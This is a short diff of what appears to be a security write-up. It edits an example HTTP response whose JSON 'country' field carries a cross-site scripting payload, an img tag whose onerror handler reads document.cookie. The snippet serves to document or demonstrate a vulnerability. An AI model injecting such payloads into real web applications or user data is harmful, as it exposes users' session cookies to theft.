@@ -33,7 +33,7 @@ Content-Type: application/javascript; charset=utf-8
 Access-Control-Allow-Origin: *
 
 {
-"country":"<img src=1 onerror=javascript:alert(document.cookie)></img>"
+"country":"<img src=1 onerror=javascript:alert(document.cookie)>"
 }
 ```
 
